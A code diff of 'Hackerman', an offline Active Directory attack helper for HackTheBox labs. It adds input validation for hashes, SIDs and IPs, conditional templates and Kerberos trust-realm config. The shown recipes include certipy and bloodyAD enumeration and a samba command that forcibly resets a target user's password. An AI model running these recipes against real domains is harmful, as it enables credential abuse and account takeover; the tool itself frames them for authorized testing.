@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Hackerman v1.22.0 — AD Attack Helper (Kali · HTB)</title>
+<title>Hackerman v2.0.0 — AD Attack Helper (Kali · HTB)</title>
 <style>
 :root{
   --bg:#0a0f1a; --panel:#0f1729; --panel2:#131d33; --line:#1e2b45;
@@ -51,6 +51,8 @@ label.proxy.on{border-color:var(--accent);color:#fff}
 .field input.derived{color:#7dd3fc;background:#0a1322;border-style:dashed;border-color:#2a3f63;cursor:copy}
 .field input.req-missing{border-left:3px solid var(--warn)}
 .field input.src-hl{border-color:var(--accent);box-shadow:0 0 0 1px var(--accent)}
+.field input.bad{border-color:#ef4444}
+.field .fwarn{flex:none;color:#f59e0b;font-size:13px;cursor:help;line-height:1}
 .field label .lauto{display:inline-block;margin-left:5px;font-size:9px;letter-spacing:.08em;text-transform:uppercase;color:#7dd3fc;border:1px solid #164e63;border-radius:4px;padding:0 4px;vertical-align:1px}
 @keyframes fieldflash{0%,100%{box-shadow:0 0 0 0 transparent}50%{box-shadow:0 0 0 2px var(--warn)}}
 .field input.field-flash{animation:fieldflash .45s 3}
@@ -280,13 +282,14 @@ kbd{background:var(--panel2);border:1px solid var(--line);border-bottom-width:2p
 
 <header>
   <div class="hwrap">
-    <div class="brand">Hackerman <b>v1.22.0</b> <span class="dim mono" style="font-size:11.5px">by @bongoalex · deepseek</span></div>
+    <div class="brand">Hackerman <b>v2.0.0</b> <span class="dim mono" style="font-size:11.5px">by @bongoalex · deepseek</span></div>
     <div class="hactions">
       <select id="presetSel" title="Load preset"><option value="">— presets —</option></select>
       <button id="presetSave" title="Save current context as preset">Save</button>
       <button id="presetDel" class="ghost" title="Delete selected preset">Del</button>
       <button id="exampleBtn" class="ghost" title="fill context with the argon.htb example from the writeup notes">example</button>
       <button id="zshBtn" class="ghost" title="export zsh completions (_hackerman)">zsh</button>
+      <button id="flashBtn" class="ghost" title="spaced-repetition flashcards for AD attack strategies (separate page)">flashcards</button>
       <button id="expBtn" class="ghost" title="Export context as JSON">Export</button>
       <button id="impBtn" class="ghost" title="Import context JSON">Import</button>
       <button id="resetBtn" class="ghost" title="Reset context">Reset</button>
@@ -337,7 +340,7 @@ kbd{background:var(--panel2);border:1px solid var(--line);border-bottom-width:2p
   <section id="tab-legend" class="tab"></section>
 </main>
 
-<footer class="mono">Hackerman v1.22.0 · by @bongoalex &amp; deepseek · single-file · offline · no telemetry</footer>
+<footer class="mono">Hackerman v2.0.0 · by @bongoalex &amp; deepseek · single-file · offline · no telemetry</footer>
 
 <div id="focusOverlay" class="hidden">
   <div id="focusBox" role="dialog" aria-modal="true" tabindex="-1" aria-label="recipe focus">
@@ -570,7 +573,7 @@ function stepCreds(step){
     const r = RECIPES.find(x => x.id === id);
     if(!r) return;
     r.cmds.forEach(c => {
-      const tpl = Array.isArray(c) ? c[0] : c;
+      const tpl = expandConditionals(Array.isArray(c) ? c[0] : c);
       let m; const re = /\{\{(\w+)\}\}/g;
       while((m = re.exec(tpl))){
         const k = m[1];
@@ -629,6 +632,75 @@ function val(k){
   return v;
 }
 
+/* plausibility checks — warn only, never rewrite the value */
+const RE_HEX32 = /^[0-9a-fA-F]{32}$/, RE_HEX64 = /^[0-9a-fA-F]{64}$/;
+const RE_IPV4 = /^(25[0-5]|2[0-4]\d|1?\d?\d)(\.(25[0-5]|2[0-4]\d|1?\d?\d)){3}$/;
+const RE_IPV6ISH = /^[0-9a-fA-F:]+$/;
+const RE_SID = /^S-1-5-21(-\d+){3}(-\d+)?$/i;
+function validateField(k, raw){
+  const v = (raw == null ? '' : String(raw)).trim();
+  if(!v) return null;
+  const warn = msg => ({level:'warn', msg});
+  switch(k){
+    case 'nthash': case 'trust_nthash': case 'trust_key':
+      if(v.includes(':')) return warn('looks like a full secretsdump line (LM:NT) — only the part after the colon is the NT hash');
+      if(!RE_HEX32.test(v)) return warn('NT hash = 32 hex characters');
+      return null;
+    case 'krbtgt_hash':
+      if(v.includes(':')) return warn('strip the LM part — use the NT hash (32 hex) or the AES256 key (64 hex)');
+      if(!RE_HEX32.test(v) && !RE_HEX64.test(v)) return warn('expected: NT hash (32 hex) or AES256 key (64 hex)');
+      return null;
+    case 'aeskey': case 'trust_aeskey':
+      if(RE_HEX64.test(v)) return null;
+      if(RE_HEX32.test(v)) return warn('32 hex looks like AES128 — works with -aesKey, but AES256 (64 hex) is preferred');
+      return warn('AES256 key = 64 hex characters');
+    case 'domain_sid': case 'trust_domain_sid': case 'extra_sid':
+      if(!RE_SID.test(v)) return warn('SID format: S-1-5-21-x-x-x (optionally -RID)');
+      if(k === 'extra_sid' && /-(500|512|518|519)$/.test(v)) return warn('RID 500–1000 is stripped by SID filtering cross-forest — only RIDs >1000 usually survive');
+      return null;
+    case 'user_rid':
+      if(!/^\d+$/.test(v)) return warn('RID is numeric (e.g. 2101)');
+      if(parseInt(v, 10) >= 500 && parseInt(v, 10) <= 1000) return warn('RID 500–1000 is the built-in range — user RIDs are usually >1000');
+      return null;
+    case 'lport':
+      if(!/^\d+$/.test(v)) return warn('port must be numeric');
+      if(parseInt(v, 10) < 1 || parseInt(v, 10) > 65535) return warn('port range is 1–65535');
+      return null;
+    case 'dc_ip': case 'target_ip': case 'attacker_ip': case 'trust_dc_ip':
+      if(RE_IPV4.test(v)) return null;
+      if(RE_IPV6ISH.test(v)) return warn('looks like IPv6 — most AD tooling here expects IPv4');
+      return warn('not a valid IPv4 address');
+    case 'domain': case 'trust_domain':
+      if(/\s/.test(v)) return warn('domain names contain no spaces');
+      if(!/^[a-zA-Z0-9][a-zA-Z0-9.-]*\.[a-zA-Z]{2,}$/.test(v)) return warn('expected an FQDN like argon.htb');
+      if(/[A-Z]/.test(v)) return warn('uppercase — the FQDN convention here is lowercase');
+      return null;
+    case 'netbios': case 'trust_netbios':
+      if(v.includes('.')) return warn('NetBIOS has no dots — that looks like an FQDN');
+      if(/\s/.test(v)) return warn('no spaces in a NetBIOS name');
+      return null;
+    case 'computer_name':
+      if(v.endsWith('$')) return warn('enter it WITHOUT the trailing $ — impacket/bloodyAD append it themselves');
+      return null;
+    case 'password': case 'trust_pass': case 'computer_pass':
+      if(String(raw) !== v) return warn('leading/trailing spaces get lost when copying commands');
+      return null;
+    case 'ccache': case 'keytab': case 'wordlist': case 'hashfile':
+      if(/\s/.test(v)) return warn('path contains spaces — quote it in commands');
+      return null;
+    case 'proxy_chain':
+      if(!/^(socks4|socks5|http|https)\s+\S+/.test(v)) return warn('expected format: socks5 127.0.0.1 1080');
+      return null;
+    case 'spn':
+      if(!v.includes('/')) return warn('SPN format: service/host (e.g. MSSQLSvc/PROD-SQL)');
+      return null;
+    case 'dn': case 'dc_dn':
+      if(!/^(CN|OU|DC)=/i.test(v)) return warn('a DN starts with CN=, OU= or DC=');
+      return null;
+  }
+  return null;
+}
+
 function proxyOn(){ return !!S.proxy; }
 
 function isLocalCmd(tpl){
@@ -639,10 +711,18 @@ function isLocalCmd(tpl){
   return ['klist','kinit','kvno','kdestroy','ls','cat','unset','bash','rm','mkfifo','stty'].indexOf(first) >= 0;
 }
 
+function expandConditionals(tpl){
+  return String(tpl).replace(/\{\{#if\s+(!?)(\w+)\}\}\n?([\s\S]*?)\{\{\/if\}\}\n?/g, (m, neg, key, body) => {
+    const on = !!val(key);
+    return (neg ? !on : on) ? body : '';
+  });
+}
+
 function renderCommand(c, opts){
   let tpl, label = '', flags = '';
   if(Array.isArray(c)){ tpl = c[0]; label = c[1] || ''; flags = c[2] || ''; }
   else { tpl = c; }
+  tpl = expandConditionals(tpl);
   const noProxyOpt = opts && opts.noProxy;
   const parts = [], miss = [], missK = [];
   const re = /\{\{(\w+)\}\}/g;
@@ -984,6 +1064,18 @@ function recipeCard(r, alwaysExpanded){
 /* ============================== context bar ============================== */
 const GROUPS = ['Domain / DC','Target','Access','Attacker','Attack params'];
 const ctxInputs = {};
+const ctxWarns = {};
+
+function refreshFieldWarn(k){
+  const i = ctxInputs[k], wb = ctxWarns[k];
+  if(!i || !wb) return null;
+  const d = VAR_DEFS.find(v => v.k === k);
+  const w = (d && d.derive) ? null : validateField(k, S[k]);
+  i.classList.toggle('bad', !!w);
+  wb.style.display = w ? '' : 'none';
+  if(w) wb.dataset.tip = '<b>implausible value</b><br>' + w.msg + '<br><span class="dim">warn only — the value is still used in commands</span>';
+  return w;
+}
 
 function buildContext(){
   const body = $('#ctxBody');
@@ -1010,7 +1102,7 @@ function buildContext(){
       }
       const handler = () => {
         if(v.derive) return;
-        S[v.k] = i.value; saveState(); updateSummary(); scheduleRender();
+        S[v.k] = i.value; saveState(); refreshFieldWarn(v.k); updateSummary(); scheduleRender();
       };
       i.addEventListener('input', handler);
       i.addEventListener('change', handler);
@@ -1023,6 +1115,10 @@ function buildContext(){
         i.addEventListener('click', () => i.select());
       }
       f.appendChild(l); f.appendChild(i);
+      const wb = document.createElement('span');
+      wb.className = 'fwarn hastip'; wb.textContent = '⚠'; wb.style.display = 'none'; wb.tabIndex = 0;
+      ctxWarns[v.k] = wb;
+      f.appendChild(wb);
       if(LOOT_FIELD[v.k]){
         const p = document.createElement('button');
         p.type = 'button'; p.className = 'pick'; p.textContent = '▾';
@@ -1045,6 +1141,7 @@ function syncContext(){
     if(!i) return;
     if(i === active && !v.derive) return;
     i.value = val(v.k);
+    refreshFieldWarn(v.k);
     const hue = lootHueFor(v.k, val(v.k));
     if(hue){ i.style.setProperty('--idhue', hue); i.classList.add('idhued'); }
     else i.classList.remove('idhued');
@@ -1090,7 +1187,14 @@ function updateSummary(){
   if(val('domain')) bits.push(val('domain'));
   if(val('user')) bits.push(val('user') + (val('password') ? ':•••' : (val('nthash') ? ' #hash' : (val('ccache') ? ' #ccache' : ''))));
   if(val('target_host')) bits.push('→ ' + val('target_host'));
+  const warns = fieldWarnCount();
+  if(warns) bits.push('⚠ ' + warns);
   $('#ctxSummary').textContent = bits.join('  ');
+}
+function fieldWarnCount(){
+  let n = 0;
+  VAR_DEFS.forEach(v => { if(!v.derive && ctxInputs[v.k] && validateField(v.k, S[v.k])) n++; });
+  return n;
 }
 
 /* ============================== recipes tab ============================== */
@@ -1560,9 +1664,10 @@ function renderLegend(){
   const tab = $('#tab-legend');
   tab.innerHTML = '';
   const about = document.createElement('div');
-  about.innerHTML = '<h2 class="sec" style="margin-top:4px">Hackerman v1.22.0</h2>' +
+  about.innerHTML = '<h2 class="sec" style="margin-top:4px">Hackerman v2.0.0</h2>' +
     '<p class="dim">Single-file Active Directory attack helper for Kali, built by <b>@bongoalex</b> with <b>deepseek</b>. ' +
-    RECIPES.length + ' recipes · ' + FLOWS.length + ' wizard flows · ' + CYPHER.length + ' BloodHound queries. Offline, no dependencies, no telemetry.</p>' +
+    RECIPES.length + ' recipes · ' + FLOWS.length + ' wizard flows · ' + CYPHER.length + ' BloodHound queries · 106 <b>flashcards</b> (separate page, header button). Offline, no dependencies, no telemetry.</p>' +
+    '<p class="dim">Context fields run <b>plausibility checks</b> (⚠ badge, tooltip; warn-only) and recipe commands support <b>conditional blocks</b> (<span class="mono">{{#if var}}…{{/if}}</span>) — the Kerberos setup conf covers the trust realm automatically.</p>' +
     '<p class="dim">Use only for authorized testing (HTB labs, your own infrastructure, signed engagements). Syntax is version-sensitive — cross-check against your target versions.</p>';
   tab.appendChild(about);
   const h = document.createElement('h2');
@@ -1841,6 +1946,7 @@ function initUI(){
     saveState(); syncContext(); renderActiveTab(); toast('example loaded');
   });
   $('#zshBtn').addEventListener('click', () => openModal('zsh completion — _hackerman', buildZshCompletion(), null, '_hackerman'));
+  $('#flashBtn').addEventListener('click', () => window.open('flashcards.html', '_blank'));
   $('#proxyChk').addEventListener('change', e => {
     S.proxy = e.target.checked; saveState(); syncContext(); renderActiveTab();
   });
@@ -2179,11 +2285,22 @@ cmds:[
     {{realm}} = {
         kdc = {{dc_ip}}
     }
+{{#if trust_domain}}
+    {{trust_realm}} = {
+        kdc = {{trust_dc_ip}}
+    }
+{{/if}}
 
 [domain_realm]
     .{{domain}} = {{realm}}
-    {{domain}} = {{realm}}`,'krb5.conf content (copy)','n'],
- [`echo '{{dc_ip}}  {{dc_fqdn}} {{domain}}' | sudo tee -a /etc/hosts`,'2) name resolution — Kerberos needs hostnames, not IPs','ns'],
+    {{domain}} = {{realm}}
+{{#if trust_domain}}
+    .{{trust_domain}} = {{trust_realm}}
+    {{trust_domain}} = {{trust_realm}}
+{{/if}}`,'krb5.conf content (copy — includes the trust realm when {{trust_domain}} is set)','n'],
+ [`echo '{{dc_ip}}  {{dc_fqdn}} {{domain}}' | sudo tee -a /etc/hosts
+{{#if trust_domain}}echo '{{trust_dc_ip}}  {{trust_dc_fqdn}} {{trust_domain}}' | sudo tee -a /etc/hosts
+{{/if}}`,'2) name resolution — Kerberos needs hostnames, not IPs (both realms when trust fields are set)','ns'],
  [`date -u`,'3) clock skew must be < 5 min — compare with the DC','n'],
  [`sudo apt install -y faketime ntpsec-ntpdate`,'time helpers (once)','ns'],
  [`sudo ntpdate -u {{dc_ip}}`,'sync clock via NTP (package ntpsec-ntpdate)','ns'],
@@ -2214,7 +2331,7 @@ cmds:[
  [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -k ccache={{ccache}} get object '{{user}}'`,'bloodyAD: -k ccache=FILE (no env needed)'],
  [`KRB5CCNAME={{ccache}} certipy find -u '{{user}}@{{domain}}' -k -no-pass -dc-ip {{dc_ip}} -stdout`,'certipy: -k -no-pass (env inline)'],
  [`net rpc password '{{target_user}}' 'Pwn3d123!' -U '{{domain}}/{{user}}' --use-krb5-ccache={{ccache}} -S {{dc_host}}`,'samba net: --use-krb5-ccache=FILE']
-],note:'Typical failures: <span class="mono">KRB_AP_ERR_SKEW</span> = clock — sync (<span class="mono">ntpdate/rdate/chrony</span>) or wrap a single command with <span class="mono">faketime</span>. <span class="mono">KDC_ERR_WRONG_REALM</span> = krb5.conf. <span class="mono">Server not found in Kerberos database</span> = missing /etc/hosts entry or wrong SPN (<span class="mono">kvno</span> verifies it). If <span class="mono">-k</span> is silently ignored, KRB5CCNAME is not set — check with <span class="mono">echo $KRB5CCNAME</span>; stale caches: <span class="mono">unset KRB5CCNAME</span> + <span class="mono">klist -A</span>. Kerberos always needs the FQDN; IPs break SPNs. <span class="mono">-no-pass</span> tells impacket not to prompt when using <span class="mono">-k</span>.'});
+],note:'Typical failures: <span class="mono">KRB_AP_ERR_SKEW</span> = clock — sync (<span class="mono">ntpdate/rdate/chrony</span>) or wrap a single command with <span class="mono">faketime</span>. <span class="mono">KDC_ERR_WRONG_REALM</span> = krb5.conf. <span class="mono">Server not found in Kerberos database</span> = missing /etc/hosts entry or wrong SPN (<span class="mono">kvno</span> verifies it). If <span class="mono">-k</span> is silently ignored, KRB5CCNAME is not set — check with <span class="mono">echo $KRB5CCNAME</span>; stale caches: <span class="mono">unset KRB5CCNAME</span> + <span class="mono">klist -A</span>. Kerberos always needs the FQDN; IPs break SPNs. <span class="mono">-no-pass</span> tells impacket not to prompt when using <span class="mono">-k</span>.<br><b>Trusts:</b> the krb5.conf and the hosts command above render the partner realm and host entry automatically as soon as <span class="mono">{{trust_domain}}</span> / <span class="mono">{{trust_dc_ip}}</span> are set — one conf for both realms.'});
 
 R({id:'asrep',cat:'krb',title:'AS-REP roasting',desc:'Accounts without Kerberos pre-authentication hand out crackable AS-REP hashes unauthenticated.',
 cmds:[
@@ -4094,7 +4211,7 @@ function zshEmit(data){
   const fnName = n => '_hk_' + n.replace(/[^A-Za-z0-9_]/g, '_');
   const q = s => "'" + String(s).replace(/'/g, "'\\''") + "'";
   let out = '#compdef ' + names.concat(Object.keys(aliases)).join(' ') + '\n';
-  out += '# Hackerman v1.22.0 — generated from index.html. Regenerate: "zsh" button in the header or tools/gen-zsh-completions.mjs\n\n';
+  out += '# Hackerman v2.0.0 — generated from index.html. Regenerate: "zsh" button in the header or tools/gen-zsh-completions.mjs\n\n';
   out += '_hackerman() {\n  local tool=${words[1]:t}\n  case $tool in\n';
   names.forEach(n => { out += '    ' + n + ') ' + fnName(n) + ' ;;\n'; });
   Object.keys(aliases).forEach(a => { out += '    ' + a + ') ' + fnName(aliases[a]) + ' ;;\n'; });
